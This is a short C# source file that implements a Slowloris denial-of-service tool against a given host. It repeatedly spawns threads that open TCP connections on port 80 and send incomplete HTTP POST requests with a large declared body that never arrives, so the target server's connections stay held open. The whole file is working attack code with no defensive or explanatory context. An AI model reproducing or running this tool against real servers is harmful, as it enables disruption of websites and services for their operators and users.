using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace SlowlorisSharp
{
    public class Slowloris
    {
        public string Host { get; private set; }

        public CancellationToken CancelToken { get; private set; }

        public Slowloris(string host, CancellationToken cancelToken)
        {
            Host = host;
            CancelToken = cancelToken;
        }

        public void Manage()
        {
            ThreadStart start = null;
            var clients = new List<TcpClient>();

            while (!CancelToken.IsCancellationRequested)
            {
                if (start == null)
                {
                    start = async delegate
                    {
                        var item = new TcpClient();
                        clients.Add(item);
                        try
                        {
                            await item.ConnectAsync(Host, 80);
                            var writer = new StreamWriter(item.GetStream());
                            writer.Write("POST / HTTP/1.1\r\nHost: " + Host + "\r\nContent-length: 5235\r\n\r\n");
                            writer.Flush();
                        }
                        catch
                        {
                        }
                    };
                }
                new Thread(start).Start();
                Thread.Sleep(250);
            }
            foreach (var client in clients)
            {
                try
                {
                    client.GetStream().Dispose();
                }
                catch
                {
                }
            }
        }
    }
}
